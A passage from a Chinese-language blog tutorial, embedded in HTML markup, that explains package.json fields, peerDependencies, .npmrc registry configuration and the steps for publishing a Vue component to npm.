<span class="token property">"registry"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.com/"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"repository"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"git"</span><span class="token punctuation">,</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://git.com/项目git地址"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"files"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"dist"</span><span class="token punctuation">,</span>        <span class="token string">"src"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"bugs"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://localhost:8080//issues"</span><span class="token punctuation">,</span>        <span class="token property">"email"</span><span class="token operator">:</span> <span class="token string">"bug@example.com"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"contributors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">{</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"xiaozhan"</span><span class="token punctuation">,</span>            <span class="token property">"email"</span><span class="token operator">:</span> <span class="token string">"694615432@qq.com"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"dev"</span><span class="token operator">:</span> <span class="token string">"sh ./build/build.sh"</span><span class="token punctuation">,</span>        <span class="token property">"npm-version"</span><span class="token operator">:</span> <span class="token string">"npm -v"</span><span class="token punctuation">,</span>        <span class="token property">"serve"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service serve"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"vue"</span><span class="token operator">:</span> <span class="token string">"^2.5.21"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"@vue/cli-plugin-babel"</span><span class="token operator">:</span> <span class="token string">"^3.3.0"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"peerDependencies"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="package-json-字段介绍"><a href="#package-json-字段介绍" class="headerlink" title="package.json 字段介绍"></a>package.json 字段介绍</h3><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p><code>name</code> 字段作为项目的名称。 比如 vue 中的一个组件 <code>@vue/cli-plugin-babel</code> ，前面这个 <code>@vue</code> 其实就当前包的 scope ，既命名空间。我们可以根据 <code>scope</code> 配置一些私有包 <code>registry</code>，从而达到一些包来源于特定的地址。</p><pre class="line-numbers language-txt"><code class="language-txt">registry=https://registry.npm.taobao.org/@pay-plugin:registry=https://npm.udolphin.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="version"><a href="#version" class="headerlink" title="version"></a>version</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> version <span class="token punctuation">[</span><span class="token operator">&lt;</span>newversion<span class="token operator">></span> <span class="token operator">|</span> major <span class="token operator">|</span> minor <span class="token operator">|</span> patch <span class="token operator">|</span> premajor <span class="token operator">|</span> preminor <span class="token operator">|</span> prepatch <span class="token operator">|</span> prerelease <span class="token punctuation">[</span>--preid<span class="token operator">=</span><span class="token operator">&lt;</span>prerelease-id<span class="token operator">></span><span class="token punctuation">]</span> <span class="token operator">|</span> from-git<span class="token punctuation">]</span><span class="token string">'npm [-v | --version]'</span> to print <span class="token function">npm</span> version<span class="token string">'npm view &lt;pkg> version'</span> to view a package<span class="token string">'s published version'</span><span class="token function">npm</span> ls' to inspect current package/dependency versions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> “version”: “0.1.0”, 对应 <code>major-minor-patch</code> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 更新 major 的位置，其余位置为 0</span><span class="token function">npm</span> version major <span class="token comment" spellcheck="true"># 更新 minor 的位置，major 不变，其余位置为 0</span><span class="token function">npm</span> version minor <span class="token comment" spellcheck="true"># 更新 patch 的位置，其余位置不变</span><span class="token function">npm</span> version patch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>major 对应一次大的迭代，比如 vue 3.0 ts 重新，添加新的功能，更新 major 版本号</li><li>minor 对应小版本迭代，发生兼容旧版API的修改或功能添加时，更新 minor 版本号</li><li>patch 对应修订版本号，一般针对 bug 修复时，修改 patch 的版本号</li></ul><p>当你的项目需要发布的时候，version 一定要和以前的不一样，否则发布不成功。</p><h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p>标识当前包是否私有，为 <code>true</code> 时包不能发布。</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>默认 index.js。指定 import 或 require 的时候加载的 js。</p><h4 id="keywords"><a href="#keywords" class="headerlink" title="keywords"></a>keywords</h4><p>描述当前项目的关键字，用于检索当前插件。</p><h4 id="publishConfig"><a href="#publishConfig" class="headerlink" title="publishConfig"></a>publishConfig</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"publishConfig"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"registry"</span><span class="token punctuation">:</span> <span class="token string">"https://registry.npmjs.com/"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>有的时候呢我们在 <code>.npmrc</code> 配置了别的 <code>registry</code> ，比如淘宝镜像。我安装依赖包的时候呢，想从淘宝镜像安装。发布插件的时候想发布到官网上。就可以在 <code>publishConfig</code> 中配置了。 </p><h4 id="files"><a href="#files" class="headerlink" title="files"></a>files</h4><p>指定发布的依赖包，包含的文件，默认会忽略一些文件。也可以根目录下创建 .npmignore 忽略一些文件。</p><p><img src="http://oss.mflyyou.cn/blog/20200304021818.png"></p><h4 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h4><p>配置一些执行脚本。比如说 <code>npm run dev</code> 就是运行 <code>sh ./build/build.sh</code>。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 运行 shell 脚本</span>    <span class="token string">"dev"</span><span class="token punctuation">:</span> <span class="token string">"sh ./build/build.sh"</span><span class="token punctuation">,</span>    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"npm -v"</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// build 成功之后会执行 publish    </span>    <span class="token string">"pub"</span><span class="token punctuation">:</span> <span class="token string">"npm run build &amp;&amp; npm publish"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h4><p>项目的开发依赖。key 为模块名称，value 为版本范围。项目打包时会将这里的依赖打包进去。</p><p><a href="https://github.com/wanguzhang/fly-npm">fly-npm 地址</a></p><p>fly-npm 和 fly-use-npm 已发布。</p><p>注意，这里也有个坑。比如我有两个插件 fly-npm，fly-use-npm，fly-use-npm 中 dependencies 中依赖 fly-npm。我在 my-vue 项目开发的时候引入 fly-use-npm。我是可以直接 <code>import fly-use-npm</code> 项目可以正常运行。但是当你 <code>import fly-npm</code>  项目解析依赖会报错。因为只有在当前项目中 dependencies 引入的依赖才可以被 import。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"clickTest"</span><span class="token operator">></span>            测试        <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token comment" spellcheck="true">// fly-npm 只有在当前 my-vue 项目 dependencies 引入才可以被 import</span><span class="token comment" spellcheck="true">//import flyNpm from 'fly-npm';    </span><span class="token keyword">import</span> flyUseNpm <span class="token keyword">from</span> <span class="token string">'fly-use-npm'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'TestPlugin'</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token function">clickTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">flyUseNpm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="devDependencies"><a href="#devDependencies" class="headerlink" title="devDependencies"></a>devDependencies</h4><p>为开发依赖，打包的时候不会打包进去。比如我们使用的 <code>babel</code> <code>webpak</code> 等相关的插件，打包的时候，并不会被打包进去。</p><h4 id="peerDependencies"><a href="#peerDependencies" class="headerlink" title="peerDependencies"></a>peerDependencies</h4><p>在将这个之前，我们先来了解 npm 的树形依赖是什么意思。</p><p>我创建一个 vue 项目 my-vue 依赖 fly-use-npm(它依赖 fly-npm 1.0.0)，fly-npm(2.0.0)，在我们项目中可以看到。</p><p>当 <code>my-vue</code> 没有引入 <code>fly-npm 2.0.0</code> 的时候，<code>my-vue/node_modules/fly-npm</code> 为 1.0.0。</p><p><img src="http://oss.mflyyou.cn/blog/20200304021831.png"></p><p>当我们引入 <code>fly-npm 2.0.0</code> 的时候，依赖关系图如上图，这就是树形依赖。</p><p>下面是测试引入 <code>fly-npm 2.0.0</code> 之后的变化。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>template<span class="token operator">></span>    <span class="token operator">&lt;</span>div<span class="token operator">></span>        <span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"clickTest"</span><span class="token operator">></span>            测试        <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">import</span> flyUseNpm <span class="token keyword">from</span> <span class="token string">'fly-use-npm'</span><span class="token punctuation">;</span><span class="token keyword">import</span> flyNpm <span class="token keyword">from</span> <span class="token string">'fly-npm'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">'TestPlugin'</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token function">clickTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 打印 2.0.0</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fly-npm'</span><span class="token punctuation">,</span> flyNpm<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 使用的是 1.0.0</span>            <span class="token function">flyUseNpm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面我们可以看到，一个项目存在了两份 fly-npm 的包。这样打包的体积相应也会增大。为了解决这个问题，引入了 <code>peerDependencies</code> 。</p><p>创建 vue 项目 my-vue，依赖 fly-use-npm(4.0.0,其 <code>peerDependencies</code> 是 fly-npm 1.0.0 )。</p><p><code>peerDependencies</code>  添加的依赖包，不会（测试的 yarn 1.22.0，npm 6.13.7）自动安装的。</p><p>当我在 my-vue 项目 <code>yarn install</code> 的时候，由于没有引入 <code>fly-npm</code> 会报错。</p><p>当我在项目中引入 <code>fly-npm 2.0.0</code> 安装会在当前项目下，出现警告信息。</p><blockquote><p>warning “ &gt; <a href="mailto:fly-use-npm@4.0.0">fly-use-npm@4.0.0</a>“ has incorrect peer dependency “<a href="mailto:fly-npm@1.0.0">fly-npm@1.0.0</a>”。</p></blockquote><p>当你开发一个组件，依赖特定包的版本就需要这样处理。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// fly-use-npm</span><span class="token keyword">import</span> flyNpm <span class="token keyword">from</span> <span class="token string">'fly-npm'</span><span class="token punctuation">;</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'引用的 fly-npm 版本为:'</span><span class="token punctuation">,</span> flyNpm<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flyNpm<span class="token punctuation">.</span>version <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'版本大于 1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> obj<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>算是场景模拟，fly-npm 最新包是 2.0.0，这算是一个重大版本升级，可能存在不兼容 1.0.0 的东西。所以我在 fly-use-npm 推荐使用（peerDependencies）1.0.0。当我在实际用的时候呢，引入 fly-npm 2.0.0 ,发现某个功能依赖 fly-npm 2.0.0 报错了，就需要想到是不是依赖包不兼容的问题了。</p><p>但是同时你还想用 fly-npm 2.0.0 的功能，那你只能去提交一个 pr 兼容 fly-npm 或者 fly-use-npm 。</p><p>这种情况很少会遇到，一般版本升级都会兼容以前的功能的，也不用太在意这样的问题。</p><p>一般我们很少会遇到这种问题。<code>github</code> 上流行的库也很少会用到 <code>peerDependencies</code>。</p><h2 id="npmrc"><a href="#npmrc" class="headerlink" title=".npmrc"></a>.npmrc</h2><p><code>package.json</code> 中的依赖包从哪里安装呢？.npmrc 可以配置依赖包从哪里安装，也可以配置 npm 的一些别的配置。</p><h3 id="npmrc-配置文件优先级"><a href="#npmrc-配置文件优先级" class="headerlink" title=".npmrc 配置文件优先级"></a>.npmrc 配置文件优先级</h3><ul><li>项目配置文件: <code>/project/.npmrc</code></li><li>用户配置文件：<code>~/.npmrc</code></li><li>全局配置文件：<code>/usr/local/etc/npmrc</code></li><li>npm 内置配置文件 <code>/path/to/npm/npmrc</code></li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 获取 .npmrc 用户配置文件路径</span><span class="token function">npm</span> config get userconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>项目下 .npmrc 文件的优先级最高，可以每个项目配置不同的镜像，项目之间的配置互不影响。我们也可以指定特殊的命名空间（scope）的来源。</p><p>以<code>@thingjs-plugin</code> 开头的包从 <code>registry=https://npm.udolphin.com</code> 这里下载，其余全去淘宝镜像下载。</p><pre class="line-numbers language-txt"><code class="language-txt">registry=https://registry.npm.taobao.org/@thingjs-plugin:registry=https://npm.udolphin.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-txt"><code class="language-txt">npm config set <key> <value> [-g|--global]  //给配置参数key设置值为value；npm config get <key>                        //获取配置参数key的值；npm config delete <key>  [-g|--global]      //删除置参数key及其值；npm config list [-l]                        //显示npm的所有配置参数的信息；npm config edit                             //编辑用户配置文件npm get <key>                               //获取配置参数 key 生效的值；npm set <key> <value> [-g|--global]         //给配置参数key设置值为value；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有加 -g 配置的是用户配置文件</p><p>-g 会配置到全局配置文件</p><h2 id="npm-组件发布流程"><a href="#npm-组件发布流程" class="headerlink" title="npm 组件发布流程"></a>npm 组件发布流程</h2><ul><li>去 npm 官网申请账号</li><li>添加账号到你电脑</li><li>开发你的组件，使用 webpack,babel 处理</li><li>npm 发布你的包</li></ul><h3 id="申请账号"><a href="#申请账号" class="headerlink" title="申请账号"></a>申请账号</h3><p><a href="https://www.npmjs.com/">官网</a>申请一个账号，用于登录和发布组件。</p><p>在项目的根路径下创建 <code>.npmrc</code> 配置文件，添加如下内容。</p><pre class="line-numbers language-txt"><code class="language-txt"># 安装包的时候，配置阿里镜像registry = https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 <code>package.json</code> 中配置发布源。</p><pre class="line-numbers language-json"><code class="language-json"><span class="token property">"publishConfig"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"registry"</span><span class="token operator">:</span> <span class="token string">"https://registry.npmjs.com/"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样下载依赖包会从淘宝镜像下载，发布依赖包会发布到 npm 官网去。</p><h3 id="添加账号到你电脑"><a href="#添加账号到你电脑" class="headerlink" title="添加账号到你电脑"></a>添加账号到你电脑</h3><p> <a href="https://docs.npmjs.com/cli/adduser">添加账号命令官网说明 npm adduser</a></p><pre><code># npm adduser [--registry=url] [--scope=@orgname] [--always-auth] [--auth-type=legacy]npm adduser  --registry=https://registry.npmjs.com/</code></pre><p>运行上述命令，.npmrc 用户配置文件生成一下内容</p><pre><code>registry=https://registry.npmjs.com///registry.npmjs.com/:_authToken=xxx</code></pre><h3 id="开发你的组件，使用-webpack-babel-处理"><a href="#开发你的组件，使用-webpack-babel-处理" class="headerlink" title="开发你的组件，使用 webpack,babel 处理"></a>开发你的组件，使用 webpack,babel 处理</h3><p>由于 webpack,babel 配置比较麻烦，这里使用 <a href="https://cli.vuejs.org/zh/">vue-cli</a> 脚手架进行开发</p><h4 id="package-json-1"><a href="#package-json-1" class="headerlink" title="package.json"></a>package.json</h4><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"@thingjs-ad/thingjs-app"</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.1.1"</span><span class="token punctuation">,</span>    <span class="token property">"private"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"serve"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service serve"</span><span class="token punctuation">,</span>        <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service build --target lib --name thingjs-app ./src/index.js"</span><span class="token punctuation">,</span>        <span class="token property">"lint"</span><span class="token operator">:</span> <span class="token string">"vue-cli-service lint"</span><span class="token punctuation">,</span>        <span class="token property">"pub"</span><span class="token operator">:</span> <span class="token string">"npm run build &amp;&amp; npm publish --access=public"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"dist/thingjs-app.umd.min.js"</span><span class="token punctuation">,</span>    <span class="token property">"files"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"src"</span><span class="token punctuation">,</span>        <span class="token string">"dist"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"@vue/cli-plugin-babel"</span><span class="token operator">:</span> <span class="token string">"^4.2.0"</span><span class="token punctuation">,</span>        <span class="token property">"@vue/cli-plugin-eslint"</span><span class="token operator">:</span> <span class="token string">"^4.2.0"</span><span class="token punctuation">,</span>        <span class="token property">"@vue/cli-service"</span><span class="token operator">:</span> <span class="token string">"^4.2.0"</span><span class="token punctuation">,</span>        <span class="token property">"babel-eslint"</span><span class="token operator">:</span> <span class="token string">"^10.0.3"</span><span class="token punctuation">,</span>        <span class="token property">"eslint"</span><span class="token operator">:</span> <span class="token string">"^6.7.2"</span><span class="token punctuation">,</span>        <span class="token property">"eslint-plugin-vue"</span><span class="token operator">:</span> <span class="token string">"^6.1.2"</span><span class="token punctuation">,</span>        <span class="token property">"vue-template-compiler"</span><span class="token operator">:</span> <span class="token string">"^2.6.11"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"eslintConfig"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"root"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"env"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"node"</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"extends"</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token string">"plugin:vue/essential"</span><span class="token punctuation">,</span>            <span class="token string">"eslint:recommended"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parserOptions"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"parser"</span><span class="token operator">:</span> <span class="token string">"babel-eslint"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"rules"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"browserslist"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"> 1%"</span><span class="token punctuation">,</span>        <span class="token string">"last 2 versions"</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="组件内容"><a href="#组件内容" class="headerlink" title="组件内容"></a>组件内容</h4><p><img src="http://oss.mflyyou.cn/blog/20200304021841.png"></p><ul><li>AA.vue </li></ul><pre><code>&lt;template&gt;     &lt;div&gt;         AA 组件     &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default {    name:'AA'};&lt;/script&gt;</code></pre><ul><li>index.js</li></ul><pre><code>import AA from './components/AA.vue';const components = [AA];// 当调用 Vue.use,实际会调用这个 install 方法。Vue.component 注册全局组件。const install = function (Vue) {    components.forEach(component =&gt; {        Vue.component(component.name, component);    });};if (typeof window !== 'undefined' &amp;&amp; window.Vue) {    install(window.Vue);}export default {    version: '1.0.0',    install,    AA}</code></pre><h3 id="发布组件"><a href="#发布组件" class="headerlink" title="发布组件"></a>发布组件</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> publish --access<span class="token operator">=</span>public<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> npm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
